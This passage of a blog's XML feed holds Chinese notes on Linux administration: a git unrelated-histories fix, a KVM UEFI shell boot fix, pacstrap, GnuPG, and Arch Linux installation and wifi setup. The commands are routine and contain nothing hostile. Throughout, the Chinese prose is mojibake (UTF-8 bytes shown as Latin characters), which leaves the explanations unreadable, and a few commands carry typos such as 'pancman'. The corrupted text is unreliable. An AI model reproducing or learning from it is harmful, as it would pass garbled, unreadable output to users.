    <url>/2022/08/31/%E4%BD%BF%E7%94%A8-Git-%E6%97%B6-refusing-to-merge-unrelated-histories-%E8%A7%A3%E5%86%B3/</url>
    
    <content type="html"><![CDATA[<p>åŸå› æ˜¯ä¸¤ä¸ªä»“åº“ä¸åŒå¯¼è‡´ï¼Œæˆ‘å…ˆæ˜¯æ–°å»ºäº†ä¸€ä¸ªä»“åº“ï¼Œç„¶å <code>git add remote</code> äº†ä¸€ä¸ª gitee ä»“åº“ï¼Œæ¥ç€ <code>git pull</code> ä¸‹æ¥ï¼Œæœ€åå¾€ä¸Šé¢ç›´æ¥æäº¤äº†. è¿™å¯¼è‡´äº†é—®é¢˜ï¼Œå› ä¸ºä¸æ˜¯ç›´æ¥ <code>git clone</code> è€Œæ¥çš„ã€‚</p><p>å…ˆå°†ä¸¤ä¸ªä»“åº“ <code>merge</code> åœ¨ä¸€èµ·å°±å¯ä»¥è§£å†³ï¼Œä½†é‡åˆ°äº†æŠ¥é”™ï¼Œä½¿ç”¨ <code>--allow-unrelated-histories</code> å¯ä»¥æ¶ˆé™¤ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³ç”¨ kvm åˆ›å»º archlinux è™šæ‹Ÿæœºæ—¶è¿›å…¥ UEFI Interactive Shell é—®é¢˜</title>
    <link href="/2022/08/30/%E8%A7%A3%E5%86%B3%E7%94%A8-kvm-%E5%88%9B%E5%BB%BA-archlinux-%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%97%B6%E8%BF%9B%E5%85%A5-UEFI-Interactive-Shell-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/08/30/%E8%A7%A3%E5%86%B3%E7%94%A8-kvm-%E5%88%9B%E5%BB%BA-archlinux-%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%97%B6%E8%BF%9B%E5%85%A5-UEFI-Interactive-Shell-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>è™šæ‹Ÿæœºå¯åŠ¨åï¼Œä¼šè‡ªåŠ¨å¯»æ‰¾å¯åŠ¨åˆ†åŒº <code>/dev/vda</code> ä¸‹é¢çš„ <code>EFI/boot/</code> ç›®å½•ä¸‹çš„å¼•å¯¼æ–‡ä»¶, å¦‚ x86_64 å¹³å°çš„å¼•å¯¼æ–‡ä»¶ä¸€èˆ¬ä¸º <code>bootx64.efi</code>, è€Œå¯åŠ¨åˆ†åŒºåœ¨ UEFI Interactive Shell ç•Œé¢ä¸€èˆ¬ä»¥ <code>FS0:</code> çš„ç›˜ç¬¦å­˜åœ¨ã€‚</p><h1 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h1><p>å…ˆè¿›å…¥ <code>FS0:</code> ç›˜ç¬¦:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">Shell&gt; FS0:<br><span class="hljs-symbol">FS0:</span>\&gt;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹å½“å‰æ–‡ä»¶:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">FS0:</span>\&gt; ls<br></code></pre></td></tr></table></figure><p>è¿›å…¥ <code>EFI</code> ç›®å½•:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">FS0:</span>\&gt; cd EFI<br></code></pre></td></tr></table></figure><p>åˆ›å»º <code>boot</code> ç›®å½•å¹¶æŠŠ <code>hostname</code>(ä½ è‡ªå·±è®¾ç½®çš„) ç›®å½•ä¸‹çš„ <code>grubx64.efi</code> å¤åˆ¶åˆ° <code>boot</code> ç›®å½•ä¸­å¹¶é‡å‘½åä¸º <code>bootx64.efi</code>.</p><p>æœ€åå¯åŠ¨ <code>bootx64.efi</code> æ–‡ä»¶æ¥é‡å¯ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pacstrap çš„ä½¿ç”¨</title>
    <link href="/2022/08/30/pacstrap-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/08/30/pacstrap-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://man.archlinux.org/man/pacstrap.8">ArchWiki</a><br>pacstrap ç”¨äºå°†è½¯ä»¶åŒ…ä¸‹è½½åˆ° specified new root directory.</p><h1 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h1><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> pacstrap [<span class="hljs-keyword">option</span>] root [packages...]<br></code></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰æŒ‡å®šè½¯ä»¶åŒ…ï¼Œthe base metapackage ä¼šè¢«ä¸‹è½½ã€‚</p><p>è¿™é‡Œçš„ <code>root</code> æ˜¯ä¸€ä¸ªç›®å½•ï¼Œå¦‚è£… archlinux æ—¶:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">pacstrap /mnt base linux linux-firmware</span><br></code></pre></td></tr></table></figure><h1 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h1><p>pacstrap is designed to create a new system installation from scratch. The specified packages will be installed into a given directory after setting up some basic mountpoints.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki ä¸­å…³äº GnuPG</title>
    <link href="/2022/08/30/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-GnuPG/"/>
    <url>/2022/08/30/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-GnuPG/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/GnuPG">ArchWiki</a><br>GnuPG (å³ GPG) æ˜¯ä¸€ä¸ªè‡ªç”±è½¯ä»¶ï¼Œå…¶å®ç°äº† RFC4880 æ‰€å®šä¹‰çš„ OpenPGP æ ‡å‡†.</p><p>GnuPG å¯ç”¨äºåŠ å¯†å’Œç­¾åä½ çš„æ•°æ®å’Œé€šè®¯ä¿¡æ¯, åŒ…å«ä¸€ä¸ªé€šç”¨çš„å¯†é’¥ç®¡ç†ç³»ç»Ÿä»¥åŠç”¨äºå„ç§å…¬é’¥ç›®å½•çš„è®¿é—®æ¨¡å—ã€‚</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p>å®‰è£…è½¯ä»¶åŒ… gnupg æ—¶ï¼Œè½¯ä»¶åŒ… pinentry ä¹Ÿä¼šè¢«åŒæ—¶å®‰è£…ã€‚</p><h1 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h1><h2 id="ç›®å½•ä½ç½®"><a href="#ç›®å½•ä½ç½®" class="headerlink" title="ç›®å½•ä½ç½®"></a>ç›®å½•ä½ç½®</h2><p>é»˜è®¤ä¸º <code>~/.gnupg</code>.</p><p>æ”¹å˜:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ gpg --homedir path<span class="hljs-regexp">/to/</span><span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure><p>æˆ–è®¾ç½® <code>GNUPGHOME</code> ç¯å¢ƒå˜é‡ã€‚</p><h1 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h1><h2 id="å¯¼å‡ºå…¬é’¥"><a href="#å¯¼å‡ºå…¬é’¥" class="headerlink" title="å¯¼å‡ºå…¬é’¥"></a>å¯¼å‡ºå…¬é’¥</h2><p>GPG çš„ä¸»è¦ç”¨é€”å°±æ˜¯é€šè¿‡å…¬é’¥åŠ å¯†ä¿¡æ¯ä»¥ç¡®ä¿å…¶ç§å¯†æ€§ï¼Œä½ å¯ä»¥åˆ†å‘è‡ªå·±çš„å…¬é’¥ï¼Œè€Œå…¶ä»–äººé€šè¿‡è¯¥å…¬é’¥åŠ å¯†å‘ç»™ä½ çš„ä¿¡æ¯ã€‚</p><p>å…¶ä»–äººéœ€è¦æœ‰ä½ çš„å…¬é’¥æ‰èƒ½ç»™ä½ å‘åŠ å¯†ä¿¡æ¯ã€‚</p><h2 id="å¯¼å…¥å…¬å…±å¯†é’¥"><a href="#å¯¼å…¥å…¬å…±å¯†é’¥" class="headerlink" title="å¯¼å…¥å…¬å…±å¯†é’¥"></a>å¯¼å…¥å…¬å…±å¯†é’¥</h2><p>è¦ç»™å…¶ä»–äººå‘é€åŠ å¯†ä¿¡æ¯ï¼Œæˆ–è€…éªŒè¯ä»–ä»¬çš„ç­¾åï¼Œå°±éœ€è¦ä»–ä»¬çš„å…¬é’¥ï¼Œé€šè¿‡æ–‡ä»¶ <code>public.key</code> å¯¼å…¥å…¬é’¥åˆ°å¯†é’¥ç¯ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki ä¸­ archlinux çš„å®‰è£…</title>
    <link href="/2022/08/30/Archlinux%20%E7%9A%84%E5%AE%89%E8%A3%85/"/>
    <url>/2022/08/30/Archlinux%20%E7%9A%84%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Installation_guide">ArchWiki</a><br><a href="https://www.bilibili.com/read/cv15713480">å‚è€ƒåšå®¢</a></p><h1 id="ä¸€äº›çŸ¥è¯†ç‚¹"><a href="#ä¸€äº›çŸ¥è¯†ç‚¹" class="headerlink" title="ä¸€äº›çŸ¥è¯†ç‚¹"></a>ä¸€äº›çŸ¥è¯†ç‚¹</h1><p>Arch Linux ç°åœ¨åªæ”¯æŒ x86_64(å³ amd64) æ¶æ„.</p><p>Arch Linux çš„å‘å¸ƒç‰ˆæœ¬åªæ˜¯å®‰è£…å’Œä¿®å¤ç¯å¢ƒï¼ŒåŒ…å« base å…ƒè½¯ä»¶åŒ…å’Œä¸€äº›è¾…åŠ©è½¯ä»¶ï¼Œä¸€èˆ¬æ¯æœˆä¸Šæ—¬å‘å¸ƒä¸€æ¬¡ã€‚</p><p>ä½¿ç”¨ <code>pacman -Syu</code> å‘½ä»¤å‡çº§ç³»ç»Ÿã€‚</p><p>æ–°åŠŸèƒ½é€šè¿‡ <code>pacman -Syu</code> å³å¯æ‹¥æœ‰ã€‚</p><p><code>pacman -Qs</code> å¯ç”¨äºæŸ¥æ‰¾åŒ….</p><p><a href="https://wiki.archlinux.org/title/System_maintenance">æé«˜ç³»ç»Ÿç¨³å®šæ€§</a></p><p>Arch Linux å®‰è£…é•œåƒä¸æ”¯æŒå®‰å…¨å¯åŠ¨ (Secure Boot).</p><p>è™šæ‹Ÿæ§åˆ¶å°é»˜è®¤çš„ Shell æ˜¯ Zsh.</p><p>å¦‚æœè¦æ¸…é™¤åŸæ¥çš„åˆ†åŒºä¿¡æ¯, é€šè¿‡åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†åŒºè¡¨, åˆ©ç”¨ <code>fdisk</code>.</p><p>BIOS with MBR.</p><p>UEFI with GPT.</p><p>å¦‚æœè¦å¯åŠ¨çš„ç£ç›˜å·²ç»æœ‰ä¸€ä¸ª EFI ç³»ç»Ÿåˆ†åŒºï¼Œä¸è¦æ–°å»º EFI åˆ†åŒºã€‚</p><p>å¦‚æœè¦åˆ›å»ºä¸€ä¸ª EFI ç³»ç»Ÿåˆ†åŒºï¼Œä½¿ç”¨ <code>mkfs.fat)8</code> å°†å…¶æ ¼å¼åŒ–ä¸º Fat32.</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># mkfs.fat -F <span class="hljs-number">32</span> <span class="hljs-regexp">/dev/</span>efi_system_partition<br></code></pre></td></tr></table></figure><p>æŒ‚è½½åˆ†åŒºä¸€å®šè¦éµå¾ªé¡ºåºï¼Œå…ˆæŒ‚è½½ (root) åˆ†åŒºåˆ° (&#x2F;mnt), å†æŒ‚è½½å¼•å¯¼ (boot) åˆ†åŒºåˆ° (&#x2F;mnt&#x2F;boot æˆ– &#x2F;mnt&#x2F;efi), æœ€åå†æŒ‚è½½å…¶ä»–åˆ†åŒºã€‚</p><p>å¦‚æœåˆ›å»ºäº†äº¤æ¢ç©ºé—´å·ï¼Œä½¿ç”¨ <code>swapon</code> å¯åŠ¨å®ƒ:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># swapon <span class="hljs-regexp">/dev/</span>swap_partition<br></code></pre></td></tr></table></figure><p>æ–‡ä»¶ <code>/etc/pacman.d/mirrorlist</code> å®šä¹‰äº†è½¯ä»¶åŒ…ä¼šä»å“ªä¸ªé•œåƒä¸‹è½½.<br>å®‰è£…å¿…éœ€å¾—è½¯ä»¶åŒ…:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">pacstrap /mnt base linux linux-firmware</span><br></code></pre></td></tr></table></figure><p>åœ¨è™šæ‹Ÿæœºæˆ–å®¹å™¨ä¸­å®‰è£…æ—¶ï¼Œå¯ä»¥ä¸å®‰è£…å›ºä»¶è½¯ä»¶åŒ… (å³ linux-firmware).</p><p>è¿™é‡Œå®‰è£… <code>base-devel</code> å¯èƒ½æ›´å¥½ã€‚</p><p>è¦ç”Ÿæˆæ–‡ä»¶ç³»ç»Ÿè¡¨ï¼Œç”¨äºåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨æŒ‚è½½åˆ†åŒºã€‚</p><p>æ³¨æ„bç«™é‚£ä¸ªæ•™ç¨‹è£… kde æ¡Œé¢æ—¶ï¼Œè½¯ä»¶åŒ…æ˜¯ <code>kde-applications-meta</code>.</p><h1 id="è‡ªå·±å®‰è£…çš„å…¨è¿‡ç¨‹-ç»¼åˆå¤šä¸ªå®‰è£…æ•™ç¨‹-å¹¶åœ¨è™šæ‹Ÿæœºä¸Šå®éªŒ"><a href="#è‡ªå·±å®‰è£…çš„å…¨è¿‡ç¨‹-ç»¼åˆå¤šä¸ªå®‰è£…æ•™ç¨‹-å¹¶åœ¨è™šæ‹Ÿæœºä¸Šå®éªŒ" class="headerlink" title="è‡ªå·±å®‰è£…çš„å…¨è¿‡ç¨‹ (ç»¼åˆå¤šä¸ªå®‰è£…æ•™ç¨‹, å¹¶åœ¨è™šæ‹Ÿæœºä¸Šå®éªŒ)"></a>è‡ªå·±å®‰è£…çš„å…¨è¿‡ç¨‹ (ç»¼åˆå¤šä¸ªå®‰è£…æ•™ç¨‹, å¹¶åœ¨è™šæ‹Ÿæœºä¸Šå®éªŒ)</h1><h2 id="ä¿®æ”¹å‘½ä»¤è¡Œå­—ä½“"><a href="#ä¿®æ”¹å‘½ä»¤è¡Œå­—ä½“" class="headerlink" title="ä¿®æ”¹å‘½ä»¤è¡Œå­—ä½“"></a>ä¿®æ”¹å‘½ä»¤è¡Œå­—ä½“</h2><p>ä¿®æ”¹å‘½ä»¤è¡Œçš„å­—ä½“ï¼Œå…¶å­—ä½“æ–‡ä»¶å­˜æ”¾åœ¨ <code>/usr/share/kbd/consolefonts</code> ä¸‹:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># setfont <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/kbd/</span>consolefonts/LatGrkCyr-<span class="hljs-number">12</span>x22.psfu.gz<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå­—ä½“è¾ƒå¤§.</p><h2 id="ä¿®æ”¹é”®ç›˜å¸ƒå±€"><a href="#ä¿®æ”¹é”®ç›˜å¸ƒå±€" class="headerlink" title="ä¿®æ”¹é”®ç›˜å¸ƒå±€"></a>ä¿®æ”¹é”®ç›˜å¸ƒå±€</h2><p>ä½¿ç”¨ <code>loadkeys</code> å‘½ä»¤ï¼Œå¦‚:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># loadkeys colemak</span><br></code></pre></td></tr></table></figure><h2 id="ä¿®æ”¹é”®ä½"><a href="#ä¿®æ”¹é”®ä½" class="headerlink" title="ä¿®æ”¹é”®ä½"></a>ä¿®æ”¹é”®ä½</h2><p>æŸ¥çœ‹æ‰€æœ‰çš„ keycode, ä½¿ç”¨ <code>dumpkeys</code> å‘½ä»¤:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">dumpkeys -l</span><br></code></pre></td></tr></table></figure><p>æ–‡ä»¶åä»»æ„ï¼Œå¦‚ <code>keys.conf</code>ï¼Œå…¶ç›®çš„æ˜¯å†™ä¸€ä¸ªé”®ç›˜çš„é…ç½®æ–‡ä»¶:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># keys.conf</span><br><span class="hljs-attribute">keycode</span> <span class="hljs-number">1</span> = Caps_Lock # <span class="hljs-number">1</span> åŸæœ¬æ˜¯ Escape é”®çš„ keycode<br><span class="hljs-attribute">keycode</span> <span class="hljs-number">58</span> = Escape<br></code></pre></td></tr></table></figure><p>ç„¶åç”¨ <code>loadkeys</code> åŠ è½½ä¸€ä¸‹é…ç½®æ–‡ä»¶.</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"># loadkeys <span class="hljs-built_in">keys</span>.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹å¯åŠ¨æ–¹å¼"><a href="#æŸ¥çœ‹å¯åŠ¨æ–¹å¼" class="headerlink" title="æŸ¥çœ‹å¯åŠ¨æ–¹å¼"></a>æŸ¥çœ‹å¯åŠ¨æ–¹å¼</h2><p>å¦‚æœä¸æ˜¯ UEFI å¯åŠ¨æ–¹å¼åˆ™è£…ä¸äº† arch.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ls <span class="hljs-regexp">/sys/</span>firmware<span class="hljs-regexp">/efi/</span>efivars<br></code></pre></td></tr></table></figure><h2 id="è¿æ¥ç½‘ç»œè®¾å¤‡"><a href="#è¿æ¥ç½‘ç»œè®¾å¤‡" class="headerlink" title="è¿æ¥ç½‘ç»œè®¾å¤‡"></a>è¿æ¥ç½‘ç»œè®¾å¤‡</h2><p>å…ˆé€šè¿‡ <code>ip link</code> æŸ¥çœ‹ç½‘ç»œè®¾å¤‡, ç„¶åç”¨ <code>ip link set &lt;name&gt; up</code> è¿æ¥</p><p>è¿™é‡Œå¯èƒ½ä¼šæœ‰ <code>RTNETLINK answers: Operation not possible due to RF-kill</code> , åŸå› æ˜¯ç½‘å¡è¢«è­¦ç”¨ï¼Œè§£å†³æ–¹æ³•:</p><p>ä½¿ç”¨ <code>rfkill</code> å‘½ä»¤, å…ˆæŸ¥çœ‹å½“å‰çŠ¶æ€:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">rfkill list</span> <br></code></pre></td></tr></table></figure><p>unblock ç¡¬ä»¶:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rfkill</span> unblock è®¾å¤‡å·æˆ–å<br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨-wpa-supplicant"><a href="#ä½¿ç”¨-wpa-supplicant" class="headerlink" title="ä½¿ç”¨ wpa_supplicant"></a>ä½¿ç”¨ wpa_supplicant</h3><h4 id="æ‰«æå½“å‰-wifi"><a href="#æ‰«æå½“å‰-wifi" class="headerlink" title="æ‰«æå½“å‰ wifi"></a>æ‰«æå½“å‰ wifi</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># iwlist wlan0 scan</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>wlan0</code> æ˜¯è®¾å¤‡.</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># iwlist wlan0 scan | grep ESSID </span><br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ—å‡º wifi ååˆ—è¡¨. è¿™é‡Œ <code>ESSID</code> çš„å«ä¹‰å°±æ˜¯ wifi å.</p><h4 id="è¿æ¥-wifi"><a href="#è¿æ¥-wifi" class="headerlink" title="è¿æ¥ wifi"></a>è¿æ¥ wifi</h4><p>ä½¿ç”¨ <code>wpa_passphrase</code>.</p><p>æ ¼å¼:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"># wpa_passphrase <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">passwd</span>&gt;</span> &gt; <span class="hljs-tag">&lt;<span class="hljs-name">filename</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># wpa_passphrase CW_WIFI 12345678 &gt; internet.conf</span><br></code></pre></td></tr></table></figure><p>ç”¨ <code>wpa_supplicant</code> åˆ©ç”¨é…ç½®æ–‡ä»¶è¿æ¥ç½‘ç»œ:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># wpa_supplicant -c internet.conf -i wlan0 &amp;</span><br></code></pre></td></tr></table></figure><p><code>-c</code> é€‰é¡¹æŒ‡å®šé…ç½®æ–‡ä»¶ï¼Œ<code>-i</code> é€‰é¡¹æŒ‡å®šè®¾å¤‡. è¿™é‡Œçš„ <code>&amp;</code> æ˜¯æ”¾åœ¨åå°è¿è¡Œ.</p><p>è¿æ¥ä¹‹åéœ€åŠ¨æ€è·å–ä¸€ä¸ª IP åœ°å€ã€‚</p><h3 id="ä½¿ç”¨-iwctl"><a href="#ä½¿ç”¨-iwctl" class="headerlink" title="ä½¿ç”¨ iwctl"></a>ä½¿ç”¨ iwctl</h3><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">iwctl</span> <br>[<span class="hljs-string">iwd</span>] <span class="hljs-string">device</span> <span class="hljs-string">list</span><br>[<span class="hljs-string">iwd</span>] <span class="hljs-string">station</span> &lt;<span class="hljs-string">device</span>&gt; <span class="hljs-string">scan</span><br>[<span class="hljs-string">iwd</span>] <span class="hljs-string">station</span> &lt;<span class="hljs-string">device</span>&gt; <span class="hljs-built_in">get-networks</span><br>[<span class="hljs-string">iwd</span>] <span class="hljs-string">station</span> &lt;<span class="hljs-string">device</span>&gt; <span class="hljs-string">connect</span> &lt;<span class="hljs-string">wifi</span> <span class="hljs-string">name</span>&gt;<br>[<span class="hljs-string">iwd</span>] <span class="hljs-string">quit</span><br></code></pre></td></tr></table></figure><h3 id="åŠ¨æ€è·å–-IP-åœ°å€"><a href="#åŠ¨æ€è·å–-IP-åœ°å€" class="headerlink" title="åŠ¨æ€è·å– IP åœ°å€"></a>åŠ¨æ€è·å– IP åœ°å€</h3><p>ä½¿ç”¨ <code>dhcpcd</code>:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># dhcpcd &amp;</span><br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯æ”¾åœ¨åå°è¿è¡Œ.</p><h3 id="è‹¥æ— æ³•è¿æ¥ç½‘ç»œ"><a href="#è‹¥æ— æ³•è¿æ¥ç½‘ç»œ" class="headerlink" title="è‹¥æ— æ³•è¿æ¥ç½‘ç»œ"></a>è‹¥æ— æ³•è¿æ¥ç½‘ç»œ</h3><p>å…·ä½“æƒ…å†µä¸º <code>wlan0</code> è¿™ä¸ªè®¾å¤‡æ¶ˆå¤±äº†ï¼Œå¬ LUG ç¾¤é‡Œé¢è¯´æ˜¯æ²¡æœ‰å®‰è£…ç½‘å¡é©±åŠ¨ã€‚</p><p>æš‚æ—¶è§£å†³æ–¹æ³•ä¸ºï¼Œä½¿ç”¨å¯åŠ¨ç›˜ï¼Œç„¶å <code>arch-chroot</code> ä¸Šå»åæ“ä½œ.</p><p>å¦ä¸€ä¸ªæ–¹æ³•å°±æ˜¯æ’ç½‘çº¿.</p><p>åœ¨å·²ç»å®‰è£…å¥½çš„ç³»ç»Ÿä¸­ï¼Œ<code>iwlist</code> è¿™ä¸ªå‘½ä»¤ç”¨ä¸äº†ï¼Œå› ä¸ºæ²¡æœ‰å®‰è£…ï¼Œå› æ­¤éœ€è¦:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pancman -S wireless_tools</span><br></code></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹ç½‘å¡å‹å·"><a href="#æŸ¥çœ‹ç½‘å¡å‹å·" class="headerlink" title="æŸ¥çœ‹ç½‘å¡å‹å·"></a>æŸ¥çœ‹ç½‘å¡å‹å·</h4><p>åˆ©ç”¨ lspci:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">lspci <span class="hljs-string">| grep -i ethernet</span><br></code></pre></td></tr></table></figure><p>æ¯”å¦‚æˆ‘çš„è¾“å‡ºä¸º:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">07</span>:<span class="hljs-number">00</span>.<span class="hljs-number">0</span> Ethernet controller: Realtek Semiconductor Co., Ltd. RTL8111/<span class="hljs-number">8168</span>/<span class="hljs-number">8411</span> PCI Express Gigabit Ethernet Controller (rev <span class="hljs-number">15</span>)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ Realtek Semiconductor æ˜¯å…¬å¸å. <code>RTL8111/8168/8411</code> å°±æ˜¯ç½‘å¡å‹å·.</p><p>çœ‹æ— çº¿ç½‘å¡åº”è¯¥ä¸º <code>Network controller</code>. <a href="https://www.intel.ca/">intel</a></p><h4 id="æŸ¥çœ‹ç½‘å¡é©±åŠ¨ä»¥åŠç‰ˆæœ¬å·"><a href="#æŸ¥çœ‹ç½‘å¡é©±åŠ¨ä»¥åŠç‰ˆæœ¬å·" class="headerlink" title="æŸ¥çœ‹ç½‘å¡é©±åŠ¨ä»¥åŠç‰ˆæœ¬å·"></a>æŸ¥çœ‹ç½‘å¡é©±åŠ¨ä»¥åŠç‰ˆæœ¬å·</h4><p>è¦ä½¿ NIC ç¡¬ä»¶æ­£å¸¸è¿è¡Œï¼Œå¿…é¡»ç»™ç”µè„‘çš„ NCI ç¡¬ä»¶è®¾å¤‡å®‰è£…å¯¹åº”çš„ç½‘å¡é©±åŠ¨ç¨‹åº.</p><h5 id="ä½¿ç”¨-dmesg-å’Œ-modinfo"><a href="#ä½¿ç”¨-dmesg-å’Œ-modinfo" class="headerlink" title="ä½¿ç”¨ dmesg å’Œ modinfo"></a>ä½¿ç”¨ dmesg å’Œ modinfo</h5><p>ä½¿ç”¨ dmesg (display message) å‘½ä»¤æŸ¥çœ‹, è¿™ä¸ªå‘½ä»¤ç”¨äºæ˜¾ç¤ºå¼€æœºä¿¡æ¯ï¼Œå¼€æœºçš„ä¿¡æ¯ä¹Ÿä¿å­˜åœ¨ <code>/var/log</code> ä¸­. å†…æ ¸åœ¨å¼•å¯¼æœŸé—´ä¼šåŠ è½½å¿…è¦çš„ç¡¬ä»¶é©±åŠ¨ç¨‹åºï¼Œå› æ­¤ dmesg å‘½ä»¤çš„è¾“å‡ºä¸­ä¼šå­˜åœ¨æ˜¯å¦å®‰è£…äº†ä»¥å¤ªç½‘å¡é©±åŠ¨ç¨‹åºçš„ä¿¡æ¯.</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dmesg <span class="hljs-string">|grep NIC </span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>modinfo</code> å‘½ä»¤æŸ¥çœ‹ç‰ˆæœ¬å·, æ 